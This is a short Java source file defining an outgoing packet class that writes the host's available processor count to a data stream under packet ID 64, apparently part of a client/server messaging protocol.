package com.redpois0n.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.common.io.StringWriter;


public class Packet64InitAvailableProcessors extends AbstractOutgoingPacket {

	private int processors;

	public Packet64InitAvailableProcessors(int processors) {
		this.processors = processors;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		dos.writeInt(processors);
	}

	@Override
	public byte getPacketId() {
		return (byte) 64;
	}
}
